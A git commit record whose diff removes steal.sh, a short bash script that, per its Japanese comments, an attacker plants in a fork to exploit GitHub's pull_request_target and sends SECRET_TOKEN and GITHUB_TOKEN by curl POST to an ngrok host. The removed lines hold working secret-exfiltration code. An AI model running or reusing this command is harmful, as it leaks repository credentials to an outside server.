68967d529ddd9a08201c0df0f08934fac655d086
codekakitai51 <codekakitai51@gmail.com>
2026-04-02 03:34:21 -0400

    remove steal.sh (belongs to attacker fork only)

--- steal.sh
+++
@@ -1,7 +0,0 @@
-#!/bin/bash
-# 攻撃者がフォークに仕込むスクリプト
-# pull_request_target の脆弱性を利用してシークレットを外部サーバーに送信する
-
-curl -s -X POST https://seema-unhumoured-eximiously.ngrok-free.dev/steal \
-  -H "Content-Type: application/x-www-form-urlencoded" \
-  -d "secret=${SECRET_TOKEN}&github_token=${GITHUB_TOKEN}"
